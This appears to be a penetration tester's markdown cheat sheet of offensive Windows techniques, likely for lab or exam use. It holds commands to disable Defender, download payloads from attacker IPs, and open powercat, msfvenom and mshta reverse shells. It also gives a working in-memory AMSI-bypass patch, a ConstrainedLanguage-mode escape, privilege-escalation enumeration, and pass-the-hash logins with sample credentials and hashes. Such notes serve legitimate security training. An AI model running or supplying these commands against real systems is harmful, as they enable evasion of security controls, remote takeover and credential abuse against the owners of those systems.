- Disable Defender
    - Set-MpPreference -DisableRealtimeMonitoring $true
- C compile to exe in linux `i686-w64-mingw32-gcc adduser.c -o adduser.exe`
  
# Windows file transfers
- Powershell
    -   `powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.10.10/wget.exe','C:\Windows\Temp\wget.exe')"`
- Recieve file with powercat(send file with nc) `powercat -c 10.10.10.10 -p 443 -i file.txt`


# Windows shells
- Kali has nc.exe at /usr/share/windows-resources/binaries/nc.exe
- C# compile + run
    - `C:\windows\microsoft.net\framework64\v4.0.30319\csc.exe /t:exe /out:C:\windows\temp\rev.exe C:\windows\temp\rev.cs`
- Powershell 
    - [Invoke-PowerShellTcp.ps1](https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1)
    - [Powershell-OneLinerReverseShell](https://gist.githubusercontent.com/egre55/c058744a4240af6515eb32b2d33fbed3/raw/2c6e4a2d6fd72ba0f103cce2afa3b492e347edc2/powershell_reverse_shell.ps1)
    - Base64 encode powershell in linux and execute with -e `Cat shell.ps1 | iconv -t utf-16le | base64 -w 0`
    - [Environment]::Is64BitProcess
    - powershell -ep bypass -noprofile -WindowStyle Hidden -e UYGfxemu...
- Powercat
    - Generate reverse shell `powercat -c 10.10.10.10 -p 443 -e cmd.exe -g`
    - Encoded reverse shell `powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge`
    - Reverse shell `powercat -c 10.10.10.10 -p 443 -e cmd.exe`
    - Bind shell `powercat -l -p 443 -e cmd.exe`
    - Listener `powercat -l -p 443`
- Msf
    -   Powershell `msfvenom -p cmd/windows/reverse_powershell lhost=10.10.10.10 lport=80`
    -   MSHTA
        -   use exploit/windows/misc/hta_server
        -   mshta.exe hxxp://10.10.65.86:8080/VlHPpQahHBNkkeX.hta  
# Bypass
1. AMSI
```
$Win32 = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@
Add-Type $Win32
$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
```
2. ConstrainedLanguage mode
`Write-Host $ExecutionContext.SessionState.LanguageMode`
```
If ( $ExecutionContext.SessionState.LanguageMode -eq "ConstrainedLanguage") {

  Set-ItemProperty 'hklm:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -name '__PSLockdownPolicy' -Value 8

  Start-Process -File PowerShell.exe -Argument "-file $($myinvocation.mycommand.definition)"

  Break

}
```

# Windows privilege escalation
- whoami
- net user
- User member of which groups `net user USERNAME`
- Get hostname to understand functionality of box `hostname`
- Get system info `systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"`
- Running process `tasklist /SVC`
- Get Process statsus `wmic service where caption="Serviio" get name, caption, state, startmode`
- Start/Stop service `net start Serviio``net stop Serviio`
- Get networking info `ipconfig /all` `route print`
- Networking connections `netstat -ano`
- Firewall
	- current profile for firewall `netsh advfirewall show currentprofile`
	- Firewall rules `netsh advfirewall firewall show rule name=all`
- Scheduled Tasks `schtasks /query /fo LIST /v`
- Installed applications `wmic product get name, version, vendor`
- Security patches `wmic qfe get Caption, Description, HotFixID, InstalledOn`
- Writable files
	- `accesschk.exe -uws "Everyone" "C:\Program Files"`
	- `Get-ChildItem "C:\Program Files" - Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}`
- File permissions with Icacls
	- `icacls "C:\Program Files\Serviio\bin\ServiioService.exe"`
	- F M RX R W = Full Modify Read&Execute Read-only Write-only
- Unmounted disks `mountvol`
- Windows Drivers
	- `driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path`
	- `Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}`
- Auto elevate `reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer` `reg queryHKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer`
- Get intigrity of session(High/Medium/Low in bottom of o/p) `whoami /groups`
- Run as diffrent user `powershell.exe Start-Process cmd.exe -Verb runAs`
- whoami /priv
	- SeShutdownPrivilege = We can restart `shutdown /r /t 0`
 
- Unquoted Service Paths `wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """`
- 

### SMB with creds/hashes
- Login with creds
	- `psexec.py administrator:Password1@10.0.0.10`
	- `smbexec.py administrator:carolina@10.0.0.169`
	- `winexe -U administrator%alice_123321 //10.0.0.6 'whoami'`
	- `evil-winrm -u administrator -p rocknroll_123321 -i 10.0.0.192`
- Login with hash
    - `pth-winexe -U user%NTLM_HASH //10.10.10.10 cmd.exe`
    - `python smbclient.py -hashes 00000000000000000000000000000000:3CAC6D4B3A7E5014E32EB12EF0C75476 Domain/Administrator@IP`
